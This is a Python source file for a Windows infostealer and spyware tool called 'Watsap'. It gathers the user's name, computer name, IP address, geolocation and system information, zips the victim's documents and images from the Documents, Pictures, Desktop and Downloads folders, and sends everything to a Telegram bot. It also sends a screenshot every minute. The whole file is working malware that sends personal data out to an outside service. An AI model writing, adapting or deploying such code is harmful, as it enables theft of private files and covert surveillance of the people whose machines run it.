import os
import sys
import time
import shutil
import requests
import subprocess
import json
import pyautogui
import schedule

# Constants
VERSION = "9.2.1"
TG_TOKEN = 'TOKEN'
TG_CHAT_ID = 'CHATID'
TG_API_URL = f'https://api.telegram.org/bot{TG_TOKEN}'
TG_FILE_API_URL = f'{TG_API_URL}/sendDocument'

# Check if the operating system is Windows
if os.name != 'nt':
    sys.exit(1)

# check internet connection and check again every minute if not connected
while True:
    try:
        requests.get('https://api.telegram.org', timeout=10)
        break
    except requests.exceptions.RequestException:
        time.sleep(60)
        continue

# User Stuff
UserName = os.environ['USERNAME']
PCname = os.environ['COMPUTERNAME']
UserDir = os.environ['USERPROFILE']
DocsDir = os.path.join(UserDir, 'Documents')
PicsDir = os.path.join(UserDir, 'Pictures')
DeskDir = os.path.join(UserDir, 'Desktop')
DownDir = os.path.join(UserDir, 'Downloads')
WatsapDir = os.path.join(os.environ['APPDATA'], 'watsap')
FilesDir = os.path.join(WatsapDir, 'files')

# Generate a random id for the user

# cleanup
shutil.rmtree(WatsapDir, ignore_errors=True)

# messages
ip = requests.get('https://api.ipify.org', timeout=120).text
InfoMsg = (
    f'<b>User:</b> <code>{UserName}</code>\n'
    f'<b>PC:</b> <code>{PCname}</code>\n'
    f'<b>Version:</b> <code>{VERSION}</code>\n'
    f'<b>IP:</b> <code>{ip}</code>\n'
)

def Gen_ErrMsg(hata):
    ErrOut = str(hata)
    ErrorMsg = InfoMsg + '<b>❌ Error:</b> <code>' + ErrOut + '</code>\n'
    return ErrorMsg

current_time = time.strftime('%Y-%m-%d %H:%M:%S')

InitMsg = (
    f"<b>Watsap version:</b> <code>{VERSION}"
    f"</code> has been initialized for user: <code>{UserName}"
    f"</code> on computer: <code>{PCname}"
    f"</code> at <code>{current_time}</code>\n"
)

# Function to send a message to the Telegram chat
def tg_send_message(text):
    data = {'chat_id': TG_CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
    requests.post(f'{TG_API_URL}/sendMessage', timeout=60, data=data,)

# Function to send a file to the Telegram chat
def tg_send_file(file_path, caption):
    with open(file_path, 'rb') as file_data:
        file_dict = {'document': file_data}
        data = {'chat_id': TG_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
        requests.post(TG_FILE_API_URL, timeout=60, data=data, files=file_dict)

# Create the directory
try:
    os.makedirs(WatsapDir, exist_ok=True)
    os.makedirs(FilesDir, exist_ok=True)
except Exception as hata:
    ErrorMsg = Gen_ErrMsg(hata)
    tg_send_message(ErrorMsg)

# Get user ip and location then save it to a json file
try:
    ipinfo = requests.get('http://ipinfo.io/json', timeout=120).json()
    ip = ipinfo['ip']
    ipinfo_file = os.path.join(WatsapDir, 'ipinfo.json')
    with open(ipinfo_file, 'w', encoding='utf-8') as f:
        json.dump(ipinfo, f, ensure_ascii=False, indent=4)
except Exception as hata:
    ErrorMsg = Gen_ErrMsg(hata)
    tg_send_message(ErrorMsg)

InfoMsgGeoip = (
    InfoMsg +
    f'<b>Country:</b> <code>{ipinfo["country"]}</code>\n'
    f'<b>City:</b> <code>{ipinfo["city"]}</code>\n'
    f'<b>Region:</b> <code>{ipinfo["region"]}</code>\n'
    f'<b>Org:</b> <code>{ipinfo["org"]}</code>\n'
)

# Send system information
try:
    sysinfo = subprocess.check_output('systeminfo', shell=True).decode('utf-8')
    sysinfo_file = os.path.join(WatsapDir, 'sysinfo.txt')
    with open(sysinfo_file, 'w', encoding='utf-8') as f:
        f.write(sysinfo)
except Exception as hata:
    ErrorMsg = Gen_ErrMsg(hata)
    tg_send_message(ErrorMsg)

# take a screenshot
def take_screenshot():
    global screenshot_file
    try:
        screenshot_file = os.path.join(WatsapDir, f'{UserName}_screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_file)
        tg_send_file(screenshot_file, InfoMsg)
        os.remove(screenshot_file)
    except Exception as hata:
        ErrorMsg = Gen_ErrMsg(hata)
        tg_send_message(ErrorMsg)

# copy pics and docs
extensions = [".pdf",".docx", "xls", "xlsx", ".png", ".jpg", ".jpeg", ".heif"]
FILESIZE = 1048576
SourceDirs = [DocsDir, PicsDir, DeskDir, DownDir]
DestDir = FilesDir

def add_to_archive():
    try:
        for source_dir in SourceDirs:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    if file.endswith(tuple(extensions)):
                        if os.path.getsize(os.path.join(root, file)) <= FILESIZE:
                            shutil.copy(os.path.join(root, file), FilesDir)
        shutil.make_archive(os.path.join(WatsapDir, 'archive'), 'zip', FilesDir)
    except Exception as hata:
        ErrorMsg = Gen_ErrMsg(hata)
        tg_send_message(ErrorMsg)
        if os.path.exists(FilesDir):
            shutil.rmtree(FilesDir)

# Start sending the messages
amogus = os.path.join(os.environ['TEMP'], 'amogus')
if not os.path.exists(amogus):
    try:
        tg_send_message(InitMsg)
        tg_send_file(sysinfo_file, InfoMsg)
        tg_send_message(InfoMsgGeoip)
        tg_send_file(ipinfo_file, InfoMsg)
    except Exception as hata:
        ErrorMsg = Gen_ErrMsg(hata)
        tg_send_message(ErrorMsg)
    with open(amogus, 'w', encoding='utf-8') as f:
        f.write('amogus 31 sex selffuck')

try: 
    add_to_archive()
    tg_send_file('archive.zip', InfoMsg)
except Exception as hata:
    ErrorMsg =  Gen_ErrMsg(hata)
    tg_send_message(ErrorMsg)

try:
    os.remove('archive.zip')
except Exception as hata:
    ErrorMsg = Gen_ErrMsg(hata)
    tg_send_message(ErrorMsg)

schedule.every(1).minute.do(take_screenshot)

while True:
    schedule.run_pending()
    time.sleep(1)
